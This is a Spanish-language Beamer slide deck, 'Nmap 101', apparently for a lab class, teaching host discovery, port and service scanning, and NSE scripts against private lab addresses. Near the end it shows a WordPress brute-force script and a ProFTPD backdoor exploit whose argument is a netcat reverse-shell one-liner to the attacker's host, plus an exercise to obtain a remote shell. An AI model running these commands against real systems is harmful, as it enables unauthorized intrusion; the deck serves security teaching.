@@ -1,0 +1,556 @@
+\documentclass[aspectratio=169]{beamer}
+\usepackage{listings}
+\usepackage{multirow}
+
+
+\usetheme{Singapore}
+\usecolortheme{orchid}
+
+\definecolor{slightblue}{RGB}{0, 104, 173}
+
+\usecolortheme[named=slightblue]{structure}
+
+\definecolor{mygray}{RGB}{200, 200, 200}
+\definecolor{mygreen}{RGB}{0, 186, 11}
+\definecolor{myyellow}{RGB}{179, 176, 16}
+\definecolor{myblack}{RGB}{30, 33, 35}
+
+\lstset{ 
+    backgroundcolor=\color{myblack},
+    language=bash,
+    basicstyle=\ttfamily\color{mygray},
+    morekeywords={*,sudo, nmap, user@kali},
+    keywordstyle=\color{mygreen},
+    stringstyle=\color{myyellow},
+    showstringspaces=false,
+    breaklines=true,
+}
+
+\title{Nmap 101}
+\author{Santiago Gimenez Ocano}
+\date{}
+
+\begin{document}
+
+\begin{frame}
+    \begin{block}{}
+        \titlepage
+    \end{block}
+\end{frame}
+
+\begin{frame}
+    \frametitle{Aviso}
+    \begin{block}{}
+        \begin{center}
+            Este documento tiene \'unicamente prop\'osito educativo. Antes de analizar una red, se debe tener el permiso correspondiente.
+        \end{center}
+    \end{block}   
+\end{frame}
+
+\begin{frame}
+    \frametitle{Agenda}
+    \tableofcontents
+\end{frame}
+
+\section{Introducci\'on y Uso B\'asico}
+
+\subsection{Introducci\'on}
+\begin{frame}
+
+    \frametitle{Introducci\'on}
+
+    \begin{columns}
+        \begin{column}{0.5\textwidth}
+
+            Nmap (``Network Mapper'') es una herramienta:
+
+            \begin{itemize}
+                \item gratuita,
+                \item c\'odigo abierto,
+                \item permite encontrar dispositivos en redes,
+                \item permite hacer auditor\'ias de seguridad.
+            \end{itemize}
+
+        \end{column}
+
+        \pause
+
+        \begin{column}{0.5\textwidth}
+    
+            Nmap puede encontrar:
+
+            \begin{itemize}
+                \item los dispositivos en una red,
+                \item los servicios,
+                \item el sistema operativo,
+                \item los firewalls y filtros usados.
+            \end{itemize}
+
+        \end{column}
+    \end{columns}
+
+\end{frame}
+
+\begin{frame}
+
+    \frametitle{Introducci\'on}
+
+    \begin{block}{}
+        \begin{center}
+            Nmap es un esc\'aner de red.
+        \end{center}
+    \end{block}
+
+    \pause
+
+    \begin{block}{}
+        \begin{center}
+            Nmap nos permite saber qu\'e hay en una red en vez de qu\'e deberia haber.
+        \end{center}
+    \end{block}
+
+\end{frame}
+
+\subsection{Uso B\'asico}
+\begin{frame}[fragile]
+
+    \frametitle{Uso B\'asico}
+
+    \framesubtitle{Metodolog\'ia}
+
+    \begin{block}{}
+        \begin{center}
+            Desde una visi\'on global de la red, y llendo hacia una visi\'on particular.
+        \end{center}
+    \end{block}
+
+    \pause
+
+    \begin{center}
+        \begin{tabular}{rc}
+            \Huge$\uparrow$ & 
+            \begin{tabular}{cc}
+                \textbf{Fases de nmap} & \textbf{Modelo TCP/IP}\\ \hline
+                Escaneo con Script & Aplicaci\'on \\ \hline
+                Escaneo de Puertos & Transporte \\ \hline
+                \multirow{2}{*}{B\'usqueda de sistemas (Descubrimiento)} & Internet\\ \cline{2-2}
+                & Enlace \\ \hline
+            \end{tabular}
+        \end{tabular}
+    \end{center}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Uso B\'asico}
+
+    \framesubtitle{Sintaxis de comando}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap [Scan Type] [Options] {targets}
+    \end{lstlisting}
+
+    \texttt{Targets}:
+
+    \begin{itemize}
+        \item URLs,
+        \item lista de direcciones IP,
+        \item direcciones de red en CIDR,
+        \item mezcla de los anteriores,
+        \item desde un archivo.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+
+    \frametitle{Uso B\'asico}
+
+    \framesubtitle{Ejemplos}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap 192.168.56.16
+    \end{lstlisting}
+
+    Descubrir, escanear los 1000 puertos TCP m\'as comunes.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap 192.168.56.0/24
+    \end{lstlisting}
+
+    Descubrir, escanear los 1000 puertos TCP m\'as comunes, todos los dispositivos en la red.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap 192.168.56.16-19
+    \end{lstlisting}
+
+    Igual al enterior, pero con una lista de direcciones IP.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -iL targets.txt
+    \end{lstlisting}
+
+    Descubrir, escanear, pero con archivo con direcciones o redes IP.
+
+\end{frame}
+
+\section{Opciones}
+
+\subsection{Modificando el escaneo}
+
+\begin{frame}
+    \frametitle{Modificando el escaneo}
+
+    M\'ultiple opciones, las relacionadas a los puertos permiten:
+
+    \begin{itemize}
+        \item cambiar el n\'umero de puertos a analizar,
+        \item especificar los puertos a analizar,
+        \item mostrar solo los puertos abiertos,
+        \item escanear puertos UDP.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Modificando el escaneo}
+
+    \framesubtitle{Ejemplos (1)}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap --top-ports 10 192.168.56.16
+    \end{lstlisting}
+
+    Escanear solo los 10 puertos m\'as comunes.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -F 192.168.56.16
+    \end{lstlisting}
+
+    Escanear solo los 100 puertos m\'as comunes. ``F'' significa ``Fast''.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -p- 192.168.56.16
+    \end{lstlisting}
+
+    Escanear todos los puertos.
+
+\end{frame}
+
+\begin{frame}[fragile]
+
+    \frametitle{Modificando el escaneo}
+
+    \framesubtitle{Ejemplos (2)}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -p22,80,443 192.168.56.17
+    \end{lstlisting}
+
+    Escanear solo los puertos especificados.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap --open -p22,80,443 192.168.56.17
+    \end{lstlisting}
+
+    Igual al anterior pero solo muestra los puertos abiertos.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sU --top-ports 10 192.168.56.16
+    \end{lstlisting}
+
+    Este comando va a escanear solo los 10 puertos UDP m\'as comunes.
+
+\end{frame}
+
+\subsection{Obteniendo m\'as informaci\'on}
+\begin{frame}
+    \frametitle{Obteniendo m\'as informaci\'on}
+
+    Adem\'as podemos obtener:
+
+    \begin{itemize}
+        \item reconocimiento del sistema operativo (OS fingerprinting),
+        \item nombre y versi\'on de servicios,
+        \item informaci\'on provista por scripts b\'asicos.
+    \end{itemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Obteniendo m\'as informaci\'on}
+
+    \framesubtitle{Ejemplos}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -O 192.168.56.16
+    \end{lstlisting}
+
+    Reconocimiento del sistema operativo.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sV 192.168.56.16
+    \end{lstlisting}
+
+    Nombre y versi\'on de servicios.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sC 192.168.56.16
+    \end{lstlisting}
+
+    Informaci\'on adicional usando scripts b\'asicos.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -A 192.168.56.16
+    \end{lstlisting}
+
+    Todos los anteriories y traceroute.
+
+\end{frame}
+
+\section{M\'as Opciones}
+
+\subsection{Ajustando la velocidad}
+
+\begin{frame}[fragile]
+    \frametitle{Ajustando la velocidad}
+
+    La velocidad de escaneo es controlada de forma autom\'atica.
+
+  \pause
+
+    \vspace{1em}
+  
+    Opciones de velocidad:
+
+    \begin{itemize}
+        \item \texttt{-T0} (paranoid), 
+        \item \texttt{-T1} (sneaky), 
+        \item \texttt{-T2} (polite),
+        \item \texttt{-T3} (normal),
+        \item \texttt{-T4} (aggressive),
+        \item \texttt{-T5} (insane)
+    \end{itemize}
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -T5 192.168.56.16
+    \end{lstlisting}
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -T0 192.168.56.16
+    \end{lstlisting}
+
+\end{frame}
+
+\subsection{Guardando los resultados}
+\begin{frame}[fragile]
+    \frametitle{Guardando los resultados}
+
+    Opciones de formato:
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap [frmt {<file_name>}] {targets}
+    \end{lstlisting}
+
+    \pause
+
+    Donde \texttt{frmt}:
+
+    \begin{itemize}
+        \item \texttt{-oN} es para archivos regulares,
+        \item \texttt{-oX} es para archivos XML,
+        \item \texttt{-oG} es para archivos para ser usados con expresiones regulares.
+    \end{itemize}
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -oG results.txt 192.168.56.16
+    \end{lstlisting}
+    
+\end{frame}
+
+\section{Scripts}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+
+    Los scripts:
+
+    \begin{itemize}
+        \item aumentan el comportamiento de nmap,
+        \item permiten:
+        \begin{itemize}
+            \item obtener informaci\'on adicional,
+            \item encontrar vulnerabilidades por categoria de vulnerabilidades,
+            \item encontrar vulnerabilidades espec\'ificas.
+        \end{itemize}
+    \end{itemize}
+
+    \pause
+
+    \begin{block}{}
+        \begin{center}
+            Algunos scripts son considerados intrusivos.
+        \end{center}
+    \end{block}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+    \framesubtitle{Sintaxis}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap [--script=<script> [--script-args=<script_arguments>]] {targets}
+    \end{lstlisting}
+
+\end{frame}
+
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+    
+    \framesubtitle{Ejemplos (1)}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap --script=vuln 192.168.56.16
+    \end{lstlisting}
+
+    Ejecutar todos los scripts dentro de la categoria ``vulnerability''.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap --script="http-robots*" 192.168.56.16
+    \end{lstlisting}
+
+    Mostrar el contenido del archivo \texttt{robots.txt}.
+
+    \pause
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sV --script="http-wordpress-brute*" --script-args="passdb=./dict.txt" 192.168.56.16
+    \end{lstlisting}
+       
+    Ataque de fuerza bruta en un servicio de Wordpress.
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+    
+    \framesubtitle{Ejemplos (2)}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sV --script="ftp-proftpd-backd*" 192.168.56.19
+    \end{lstlisting}
+
+    Verificar si el target es vulnerable a una vulnerabilidad espec\'ifica.
+
+    \pause       
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=ls" 192.168.56.19
+    \end{lstlisting}
+
+    Listar el contenido de un directorio.
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Scripts}
+    
+    \framesubtitle{Ejemplos (3)}
+
+    \begin{lstlisting}
+ user@kali $ sudo nmap -sV --script="ftp-proftpd-back*" --script-args="cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 192.168.56.1 4444 >/tmp/f" 192.168.56.19
+    \end{lstlisting}
+
+    Genera una conexi\'on remota hacia el sistema del atacante. 
+    
+\end{frame}
+
+\section{Extras}
+
+\begin{frame}[fragile]
+    \frametitle{Recapitulando}
+    
+    En esta charla vimos:
+
+    \begin{itemize}
+        \item Encontar sistemas en una red,
+        \item Encontrar los puertos abiertos en los sistemas,
+        \item Obtener el nombre y versi\'on del servicio,
+        \item Ejecutar scripts para obtener m\'as info,
+        \item Ejecutar scripts para encontrar vulnerabilidades,
+        \item Ejecutar scripts para explotar vulnerabilidades.
+    \end{itemize}
+
+    \pause
+
+    \begin{block}{}
+        \begin{center}
+            Solo vimos la punta del iceberg. Los invito a investigar m\'as sobre nmap.
+        \end{center}
+    \end{block}
+    
+\end{frame}
+
+\begin{frame}
+    \begin{block}{}
+        \huge
+        \begin{center}
+            Preguntas y ?`Respuestas?
+        \end{center}
+    \end{block}
+
+    \begin{block}{Referencias}
+        \begin{itemize}
+            \item Sitio: \texttt{https://nmap.org}
+            \item Manual: \texttt{man nmap}
+            \item Scripts: \texttt{https://nmap.org/nsedoc/index.html}
+            \item Libro 1: \texttt{https://nmap.org/book}
+            \item Libro 2: Marsh, Nicholas. \textit{Nmap 6 Cookbook: The Fat-Free Guide to Network Scanning}. 2015
+        \end{itemize}
+    \end{block}
+
+\end{frame}
+
+\begin{frame}
+    \frametitle{Ejercicio}
+
+    \begin{enumerate}
+    \item Identificar el puerto escondido en 192.168.56.19.
+    \item Identificar el nombre y versi\'on del servicio en el puerto escondido.
+    \item Identificar si el servicio es vulnerable a un exploit conocido.
+    \item Obtener una conexi\'on remota cambiando los argumentos del script. 
+    \end{enumerate}
+
+\end{frame}
+
+\end{document}
